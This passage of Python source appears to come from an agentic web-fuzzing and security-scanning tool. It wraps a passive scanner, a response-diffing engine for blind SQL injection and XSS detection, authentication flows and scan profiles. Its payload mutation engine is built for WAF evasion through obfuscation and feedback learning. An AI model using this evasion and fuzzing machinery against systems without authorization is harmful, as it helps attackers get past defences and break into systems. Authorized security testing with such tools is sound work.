        "message": f"Auto-escalation {'enabled' if enabled else 'disabled'}",
    }


def get_wordlist_stats() -> Dict[str, Any]:
    """Get wordlist service statistics."""
    if not WORDLIST_SERVICE_AVAILABLE:
        return {
            "available": False,
            "message": "Wordlist service not available",
        }
    
    try:
        service = get_wordlist_service()
        stats = service.get_stats()
        available = service.get_available_wordlists()
        
        return {
            "available": True,
            "stats": stats,
            "wordlists": available,
            "total_payloads": sum(stats.get(k, 0) for k in stats if k not in ["custom_lists", "custom_entries", "external_paths"]),
        }
    except Exception as e:
        return {
            "available": False,
            "error": str(e),
        }


def get_wordlist_for_technique(technique: str, limit: int = 100) -> List[str]:
    """Get wordlist payloads for a specific technique."""
    if not WORDLIST_SERVICE_AVAILABLE:
        return []
    
    try:
        return get_wordlist_payloads(technique, limit=limit)
    except Exception as e:
        logger.warning(f"Failed to get wordlist for {technique}: {e}")
        return []


# =============================================================================
# PASSIVE SCANNER INTEGRATION
# =============================================================================

def run_passive_scan(
    url: str,
    status_code: int,
    headers: Dict[str, str],
    body: str,
    request_headers: Optional[Dict[str, str]] = None,
) -> List[Dict[str, Any]]:
    """
    Run passive security scan on a response.
    
    Args:
        url: The request URL
        status_code: HTTP status code
        headers: Response headers
        body: Response body
        request_headers: Original request headers
        
    Returns:
        List of passive security findings
    """
    if not PASSIVE_SCANNER_AVAILABLE:
        return []
    
    try:
        scanner = get_passive_scanner()
        findings = scanner.scan_response(
            url=url,
            status_code=status_code,
            headers=headers,
            body=body,
            request_headers=request_headers,
        )
        
        return [
            {
                "type": f.finding_type.value,
                "severity": f.severity.value,
                "title": f.title,
                "description": f.description,
                "evidence": f.evidence,
                "location": f.location,
                "remediation": f.remediation,
                "cwe_id": f.cwe_id,
                "confidence": f.confidence,
            }
            for f in findings
        ]
    except Exception as e:
        logger.warning(f"Passive scan error: {e}")
        return []


def get_passive_scanner_stats() -> Dict[str, Any]:
    """Get passive scanner statistics."""
    if not PASSIVE_SCANNER_AVAILABLE:
        return {"available": False}
    
    try:
        return {
            "available": True,
            **get_passive_scanner().get_stats(),
        }
    except Exception as e:
        return {"available": False, "error": str(e)}


# =============================================================================
# RESPONSE DIFFING ENGINE INTEGRATION  
# =============================================================================

def establish_response_baseline(
    url: str,
    method: str,
    responses: List[Tuple[int, Dict[str, str], str, float]]
) -> Dict[str, Any]:
    """
    Establish baseline from multiple responses.
    
    Args:
        url: Target URL
        method: HTTP method
        responses: List of (status_code, headers, body, response_time) tuples
        
    Returns:
        Baseline profile information
    """
    if not DIFFING_ENGINE_AVAILABLE:
        return {"available": False}
    
    try:
        engine = get_diffing_engine()
        profile = engine.establish_baseline(url, method, responses)
        
        return {
            "available": True,
            "url": url,
            "method": method,
            "samples": len(profile.fingerprints),
            "avg_response_time": profile.avg_response_time,
            "std_response_time": profile.std_response_time,
            "avg_content_length": profile.avg_content_length,
            "common_status_codes": list(profile.common_status_codes),
        }
    except Exception as e:
        logger.warning(f"Baseline establishment error: {e}")
        return {"available": False, "error": str(e)}


def detect_response_anomalies(
    url: str,
    method: str,
    status_code: int,
    headers: Dict[str, str],
    body: str,
    response_time: float,
    payload_info: Optional[Dict[str, Any]] = None,
) -> List[Dict[str, Any]]:
    """
    Detect anomalies by comparing response against baseline.
    
    Args:
        url: Target URL
        method: HTTP method
        status_code: Response status code
        headers: Response headers
        body: Response body
        response_time: Response time in seconds
        payload_info: Optional info about the payload used
        
    Returns:
        List of detected anomalies
    """
    if not DIFFING_ENGINE_AVAILABLE:
        return []
    
    try:
        engine = get_diffing_engine()
        fingerprint = engine.create_fingerprint(status_code, headers, body, response_time)
        anomalies = engine.detect_anomalies(url, method, fingerprint, payload_info)
        
        return [
            {
                "type": a.anomaly_type.value,
                "confidence": a.confidence,
                "description": a.description,
                "evidence": a.evidence,
                "potential_vulnerability": a.potential_vulnerability,
                "severity": a.severity,
            }
            for a in anomalies
        ]
    except Exception as e:
        logger.warning(f"Anomaly detection error: {e}")
        return []


def check_payload_reflection(payload: str, response_body: str) -> Dict[str, Any]:
    """
    Check if a payload is reflected in the response.
    
    Args:
        payload: The sent payload
        response_body: The response body
        
    Returns:
        Reflection detection results
    """
    if not DIFFING_ENGINE_AVAILABLE:
        return {"reflected": False}
    
    try:
        engine = get_diffing_engine()
        return engine.detect_reflection(payload, response_body)
    except Exception as e:
        logger.warning(f"Reflection detection error: {e}")
        return {"reflected": False, "error": str(e)}


def get_diffing_engine_stats() -> Dict[str, Any]:
    """Get diffing engine statistics."""
    if not DIFFING_ENGINE_AVAILABLE:
        return {"available": False}
    
    try:
        return {
            "available": True,
            **get_diffing_engine().get_stats(),
        }
    except Exception as e:
        return {"available": False, "error": str(e)}


# =============================================================================
# PAYLOAD MUTATION ENGINE INTEGRATION
# =============================================================================

def generate_mutated_payloads(
    payload: str,
    count: int = 10,
    context: str = "url_param",
    categories: Optional[List[str]] = None,
    avoid_blocked: bool = True,
) -> List[Dict[str, Any]]:
    """
    Generate mutated versions of a payload.
    
    Args:
        payload: Original payload
        count: Number of mutations to generate
        context: Where payload will be used (url_param, body_param, header, etc.)
        categories: Specific mutation categories to use
        avoid_blocked: Whether to avoid previously blocked patterns
        
    Returns:
        List of mutation results
    """
    if not MUTATION_ENGINE_AVAILABLE:
        return []
    
    try:
        engine = get_mutation_engine()
        
        # Map context string to enum
        context_map = {
            "url_param": PayloadContext.URL_PARAM,
            "body_param": PayloadContext.BODY_PARAM,
            "header": PayloadContext.HEADER,
            "cookie": PayloadContext.COOKIE,
            "json": PayloadContext.JSON,
            "xml": PayloadContext.XML,
            "path": PayloadContext.PATH,
        }
        ctx = context_map.get(context, PayloadContext.URL_PARAM)
        
        # Map category strings to enums
        cats = None
        if categories:
            cat_map = {c.value: c for c in MutationCategory}
            cats = [cat_map[c] for c in categories if c in cat_map]
        
        mutations = engine.mutate_payload(
            payload=payload,
            context=ctx,
            categories=cats,
            count=count,
            avoid_blocked=avoid_blocked,
        )
        
        return [
            {
                "original": m.original,
                "mutated": m.mutated,
                "category": m.category.value,
                "description": m.description,
                "evasion_techniques": m.evasion_techniques,
                "confidence": m.confidence,
            }
            for m in mutations
        ]
    except Exception as e:
        logger.warning(f"Mutation generation error: {e}")
        return []


def generate_waf_specific_mutations(
    payload: str,
    waf_name: str,
) -> List[Dict[str, Any]]:
    """
    Generate mutations optimized for a specific WAF.
    
    Args:
        payload: Original payload
        waf_name: Name of the detected WAF
        
    Returns:
        List of WAF-specific mutations
    """
    if not MUTATION_ENGINE_AVAILABLE:
        return []
    
    try:
        engine = get_mutation_engine()
        mutations = engine.get_waf_specific_mutations(payload, waf_name)
        
        return [
            {
                "original": m.original,
                "mutated": m.mutated,
                "category": m.category.value,
                "description": m.description,
                "confidence": m.confidence,
            }
            for m in mutations
        ]
    except Exception as e:
        logger.warning(f"WAF mutation error: {e}")
        return []


def record_mutation_feedback(
    payload: str,
    category: str,
    success: bool,
    blocked: bool,
    response_code: int,
):
    """
    Record feedback about a mutation attempt for learning.
    
    Args:
        payload: The mutated payload that was tested
        category: The mutation category used
        success: Whether the mutation bypassed defenses
        blocked: Whether the request was blocked
        response_code: HTTP response code received
    """
    if not MUTATION_ENGINE_AVAILABLE:
        return
    
    try:
        engine = get_mutation_engine()
        cat_map = {c.value: c for c in MutationCategory}
        
        if category in cat_map:
            feedback = MutationFeedback(
                payload=payload,
                mutation_category=cat_map[category],
                success=success,
                blocked=blocked,
                response_code=response_code,
            )
            engine.record_feedback(feedback)
    except Exception as e:
        logger.warning(f"Feedback recording error: {e}")


def detect_waf_from_response(
    headers: Dict[str, str],
    body: str,
) -> Optional[str]:
    """
    Detect WAF from response.
    
    Args:
        headers: Response headers
        body: Response body
        
    Returns:
        WAF name if detected, None otherwise
    """
    if not MUTATION_ENGINE_AVAILABLE:
        return None
    
    try:
        engine = get_mutation_engine()
        return engine.detect_waf(headers, body)
    except Exception as e:
        logger.warning(f"WAF detection error: {e}")
        return None


def get_mutation_engine_stats() -> Dict[str, Any]:
    """Get mutation engine statistics."""
    if not MUTATION_ENGINE_AVAILABLE:
        return {"available": False}
    
    try:
        return {
            "available": True,
            **get_mutation_engine().get_stats(),
        }
    except Exception as e:
        return {"available": False, "error": str(e)}


# =============================================================================
# ADVANCED AUTHENTICATION INTEGRATION
# =============================================================================

async def configure_advanced_auth(
    flow_type: str,
    **kwargs,
) -> Dict[str, Any]:
    """
    Configure advanced authentication.
    
    Args:
        flow_type: Authentication flow type
        **kwargs: Additional auth configuration
        
    Returns:
        Configuration result
    """
    if not ADVANCED_AUTH_AVAILABLE:
        return {"available": False, "error": "Advanced auth not available"}
    
    try:
        # Map flow type string to enum
        flow_map = {f.value: f for f in AuthFlowType}
        if flow_type not in flow_map:
            return {"error": f"Invalid flow type: {flow_type}"}
        
        config = AdvancedAuthConfig(
            flow_type=flow_map[flow_type],
            username=kwargs.get("username"),
            password=kwargs.get("password"),
            token=kwargs.get("token"),
            client_id=kwargs.get("client_id"),
            client_secret=kwargs.get("client_secret"),
            token_url=kwargs.get("token_url"),
            authorize_url=kwargs.get("authorize_url"),
            redirect_uri=kwargs.get("redirect_uri"),
            scope=kwargs.get("scope"),
            use_pkce=kwargs.get("use_pkce", False),
        )
        
        manager = get_auth_manager(config)
        
        return {
            "available": True,
            "configured": True,
            "flow_type": flow_type,
        }
    except Exception as e:
        logger.error(f"Auth configuration error: {e}")
        return {"available": False, "error": str(e)}


async def get_auth_headers() -> Dict[str, str]:
    """Get authentication headers for a request."""
    if not ADVANCED_AUTH_AVAILABLE:
        return {}
    
    try:
        manager = get_auth_manager()
        return await manager.get_auth_headers()
    except Exception as e:
        logger.warning(f"Auth header error: {e}")
        return {}


async def authenticate() -> Dict[str, Any]:
    """Perform authentication and return token info."""
    if not ADVANCED_AUTH_AVAILABLE:
        return {"available": False}
    
    try:
        manager = get_auth_manager()
        token = await manager.authenticate()
        
        return {
            "available": True,
            "authenticated": True,
            "token_type": token.token_type,
            "expires_at": token.expires_at,
            "has_refresh_token": bool(token.refresh_token),
        }
    except Exception as e:
        logger.error(f"Authentication error: {e}")
        return {"available": False, "error": str(e)}


def get_supported_auth_flows() -> List[str]:
    """Get list of supported authentication flows."""
    if not ADVANCED_AUTH_AVAILABLE:
        return []
    
    return [f.value for f in AuthFlowType]


# =============================================================================
# COMBINED ANALYSIS FUNCTION
# =============================================================================

async def analyze_response_comprehensive(
    url: str,
    method: str,
    status_code: int,
    headers: Dict[str, str],
    body: str,
    response_time: float,
    payload: Optional[str] = None,
    request_headers: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    """
    Perform comprehensive response analysis using all available engines.
    
    Args:
        url: Target URL
        method: HTTP method
        status_code: Response status code
        headers: Response headers
        body: Response body
        response_time: Response time in seconds
        payload: Optional payload that was sent
        request_headers: Optional original request headers
        
    Returns:
        Comprehensive analysis results
    """
    results = {
        "url": url,
        "method": method,
        "status_code": status_code,
        "response_time": response_time,
        "body_length": len(body),
    }
    
    # Run passive scan
    passive_findings = run_passive_scan(
        url=url,
        status_code=status_code,
        headers=headers,
        body=body,
        request_headers=request_headers,
    )
    if passive_findings:
        results["passive_findings"] = passive_findings
        results["passive_finding_count"] = len(passive_findings)
        results["critical_passive_findings"] = [
            f for f in passive_findings if f.get("severity") == "critical"
        ]
    
    # Detect anomalies
    payload_info = {"payload": payload} if payload else None
    anomalies = detect_response_anomalies(
        url=url,
        method=method,
        status_code=status_code,
        headers=headers,
        body=body,
        response_time=response_time,
        payload_info=payload_info,
    )
    if anomalies:
        results["anomalies"] = anomalies
        results["potential_vulnerabilities"] = [
            a.get("potential_vulnerability") 
            for a in anomalies 
            if a.get("potential_vulnerability")
        ]
    
    # Check payload reflection
    if payload:
        reflection = check_payload_reflection(payload, body)
        if reflection.get("reflected"):
            results["reflection"] = reflection
    
    # Detect WAF
    waf = detect_waf_from_response(headers, body)
    if waf:
        results["detected_waf"] = waf
    
    # Add summary
    results["analysis_summary"] = {
        "passive_issues": len(passive_findings),
        "anomalies_detected": len(anomalies),
        "payload_reflected": bool(payload and results.get("reflection", {}).get("reflected")),
        "waf_detected": bool(waf),
        "potential_vulnerabilities": results.get("potential_vulnerabilities", []),
    }
    
    return results


# =============================================================================
# COMPREHENSIVE STATS FUNCTION
# =============================================================================

def get_all_engine_stats() -> Dict[str, Any]:
    """
    Get statistics from all analysis engines.
    
    Returns comprehensive stats including:
    - Response analyzer stats
    - Passive scanner stats
    - Diffing engine stats
    - Mutation engine stats
    - Advanced auth stats
    
    Returns:
        Dict with all engine statistics
    """
    stats = {
        "response_analyzer": get_response_analyzer_stats(),
        "payload_generator": get_payload_generator_stats(),
        "attack_surface": get_attack_surface_stats(),
        "automation": get_automation_stats(),
        "wordlist": get_wordlist_stats(),
    }
    
    # Add new engine stats
    stats["passive_scanner"] = get_passive_scanner_stats()
    stats["diffing_engine"] = get_diffing_engine_stats()
    stats["mutation_engine"] = get_mutation_engine_stats()
    
    # Add auth info
    stats["advanced_auth"] = {
        "available": ADVANCED_AUTH_AVAILABLE,
        "supported_flows": get_supported_auth_flows(),
    }
    
    # Summary of engine availability
    stats["engine_availability"] = {
        "passive_scanner": PASSIVE_SCANNER_AVAILABLE,
        "diffing_engine": DIFFING_ENGINE_AVAILABLE,
        "mutation_engine": MUTATION_ENGINE_AVAILABLE,
        "advanced_auth": ADVANCED_AUTH_AVAILABLE,
        "wordlist_service": WORDLIST_SERVICE_AVAILABLE,
        "http_smuggling": HTTP_SMUGGLING_SERVICE_AVAILABLE,
        "race_condition": RACE_CONDITION_SERVICE_AVAILABLE,
        "multi_model_reasoning": MULTI_MODEL_REASONING_AVAILABLE,
        "correlation_engine": CORRELATION_ENGINE_AVAILABLE,
    }
    
    return stats


def get_engine_capabilities() -> Dict[str, Any]:
    """
    Get detailed information about engine capabilities.
    
    Returns:
        Dict describing what each engine can do
    """
    return {
        "passive_scanner": {
            "available": PASSIVE_SCANNER_AVAILABLE,
            "description": "Comprehensive passive security analysis of HTTP responses",
            "capabilities": [
                "Security header analysis (HSTS, CSP, X-Frame-Options, etc.)",
                "Cookie security validation (Secure, HttpOnly, SameSite)",
                "Sensitive data detection (AWS keys, credit cards, JWTs)",
                "CORS misconfiguration detection",
                "Debug/error information disclosure",
                "JWT security analysis",
            ] if PASSIVE_SCANNER_AVAILABLE else [],
        },
        "diffing_engine": {
            "available": DIFFING_ENGINE_AVAILABLE,
            "description": "Response comparison and anomaly detection for blind vulnerabilities",
            "capabilities": [
                "Response fingerprinting and baselining",
                "Timing anomaly detection for blind SQL injection",
                "Size anomaly detection for data extraction",
                "Content structure change detection",
                "Payload reflection detection for XSS",
            ] if DIFFING_ENGINE_AVAILABLE else [],
        },
        "mutation_engine": {
            "available": MUTATION_ENGINE_AVAILABLE,
            "description": "AI-driven payload mutation for WAF evasion",
            "capabilities": [
                "WAF signature detection (Cloudflare, AWS WAF, etc.)",
                "Unicode homoglyph substitution",
                "SQL keyword obfuscation",
                "Encoding chain mutations",
                "Learning from WAF blocks",
                "WAF-specific mutation strategies",
            ] if MUTATION_ENGINE_AVAILABLE else [],
        },
        "advanced_auth": {
            "available": ADVANCED_AUTH_AVAILABLE,
            "description": "Comprehensive authentication handling",
            "capabilities": [
                "SAML authentication with AuthnRequest generation",
                "OAuth2 with PKCE support",
                "AWS Signature V4 authentication",
                "Form login with CSRF extraction",
                "Multi-step authentication flows",
                "TOTP/MFA support",
            ] if ADVANCED_AUTH_AVAILABLE else [],
            "supported_flows": get_supported_auth_flows(),
        },
        "scan_profiles": {
            "available": SCAN_PROFILES_AVAILABLE,
            "description": "Predefined and customizable scan configurations",
            "capabilities": [
                "Predefined profiles (Quick, Standard, Full, OWASP Top 10)",
                "Compliance-focused profiles (PCI-DSS, HIPAA)",
                "Custom profile creation with technique selection",
                "Risk level and scan speed configuration",
                "Profile recommendation based on target type",
            ] if SCAN_PROFILES_AVAILABLE else [],
        },
        "intelligent_crawler": {
            "available": INTELLIGENT_CRAWLER_AVAILABLE,
            "description": "Smart web crawling for endpoint discovery",
            "capabilities": [
                "Automatic endpoint discovery",
                "Form detection and parameter extraction",
                "API endpoint discovery from JavaScript",
                "Security interest classification",
                "Sitemap generation",
                "Priority-based testing recommendations",
            ] if INTELLIGENT_CRAWLER_AVAILABLE else [],
        },
    }


# =============================================================================
# SCAN PROFILE FUNCTIONS
# =============================================================================

def get_available_profiles() -> List[Dict[str, Any]]:
    """
    Get all available scan profiles.
    
    Returns:
        List of profile descriptions
    """
    if not SCAN_PROFILES_AVAILABLE:
        return []
    
    try:
        profiles = list_profiles()
        return [
            {
                "name": p.name,
                "profile_type": p.profile_type.value if hasattr(p.profile_type, 'value') else str(p.profile_type),
                "description": p.description,
                "techniques_count": len(p.enabled_techniques),
                "risk_level": p.risk_level.value if hasattr(p.risk_level, 'value') else str(p.risk_level),
                "scan_speed": p.scan_speed.value if hasattr(p.scan_speed, 'value') else str(p.scan_speed),
            }
            for p in profiles
        ]
    except Exception as e:
        logger.warning(f"Failed to get profiles: {e}")
        return []


def get_profile_details(profile_name: str) -> Optional[Dict[str, Any]]:
    """
    Get details of a specific scan profile.
    
    Args:
        profile_name: Name of the profile
        
    Returns:
        Profile details or None if not found
    """
    if not SCAN_PROFILES_AVAILABLE:
        return None
    
    try:
        profile = get_profile(profile_name)
        return profile.to_dict() if profile else None
    except Exception as e:
        logger.warning(f"Failed to get profile '{profile_name}': {e}")
        return None


def recommend_profile(
    target_type: str = "web_application",
    risk_tolerance: str = "medium",
    time_available: str = "medium"
) -> Optional[str]:
    """
    Get a recommended profile based on constraints.
    
    Args:
        target_type: Type of target (web_application, api, etc.)
        risk_tolerance: Risk tolerance (low, medium, high)
        time_available: Time available (low, medium, high)
        
    Returns:
        Recommended profile name or None
    """
    if not SCAN_PROFILES_AVAILABLE:
        return None
    
    try:
        profile = get_recommended_profile(target_type, risk_tolerance, time_available)
        return profile.name if profile else None
    except Exception as e:
        logger.warning(f"Failed to get recommendation: {e}")
        return None


def create_session_with_profile(
    targets: List[Dict[str, Any]],
    profile_name: str,
    max_iterations: int = None,
    **session_kwargs
) -> AgenticFuzzingSession:
    """
    Create a fuzzing session with a scan profile applied.
    
    Args:
        targets: List of target configurations
        profile_name: Name of the scan profile to use
        max_iterations: Override max iterations (optional)
        **session_kwargs: Additional session arguments
        
    Returns:
        Configured AgenticFuzzingSession
    """
    # Create basic targets
    fuzzing_targets = []
    for target in targets:
        fuzzing_targets.append(FuzzingTarget(
            url=target.get("url", ""),
            method=target.get("method", "GET"),
            parameters=target.get("parameters", []),
            headers=target.get("headers", {}),
            body=target.get("body", ""),
            raw_request=target.get("raw_request", ""),
        ))
    
    # Create session with profile name
    session = AgenticFuzzingSession(
        id=str(uuid.uuid4()),
        targets=fuzzing_targets,
        scan_profile_name=profile_name,
        **session_kwargs
    )
    
    # Override max_iterations if specified
    if max_iterations:
        session.max_iterations = max_iterations
    
    # Store session
    _active_sessions[session.id] = session
    
    return session


def create_session_with_intelligent_crawl(
    base_url: str,
    crawl_depth: int = 3,
    crawl_max_pages: int = 100,
    profile_name: str = None,
    **session_kwargs
) -> AgenticFuzzingSession:
    """
    Create a fuzzing session with intelligent crawling enabled.
    
    Args:
        base_url: Base URL to crawl
        crawl_depth: Maximum crawl depth
        crawl_max_pages: Maximum pages to crawl
        profile_name: Optional scan profile to apply
        **session_kwargs: Additional session arguments
        
    Returns:
        Configured AgenticFuzzingSession
    """
    # Create initial target from base URL
    initial_target = FuzzingTarget(
        url=base_url,
        method="GET",
        parameters=[],
        raw_request=f"GET {base_url}",
    )
    
    # Create session with crawling enabled
    session = AgenticFuzzingSession(
        id=str(uuid.uuid4()),
        targets=[initial_target],
        intelligent_crawl_enabled=True,
        crawl_depth=crawl_depth,
        crawl_max_pages=crawl_max_pages,
        scan_profile_name=profile_name,
        **session_kwargs
    )
    
    # Store session
    _active_sessions[session.id] = session
    
    return session


def get_scan_profile_stats() -> Dict[str, Any]:
    """Get statistics about scan profile usage."""
    if not SCAN_PROFILES_AVAILABLE:
        return {"available": False}
    
    profiles = get_available_profiles()
    return {
        "available": True,
        "total_profiles": len(profiles),
        "profile_types": list(set(p.get("profile_type", "unknown") for p in profiles)),
        "profiles": [p.get("name") for p in profiles],
    }


def get_intelligent_crawler_stats() -> Dict[str, Any]:
    """Get statistics about intelligent crawler."""
    return {
        "available": INTELLIGENT_CRAWLER_AVAILABLE,
        "capabilities": [
            "endpoint_discovery",
            "form_extraction",
            "parameter_extraction",
            "api_discovery",
            "security_classification",
            "sitemap_generation",
        ] if INTELLIGENT_CRAWLER_AVAILABLE else [],
    }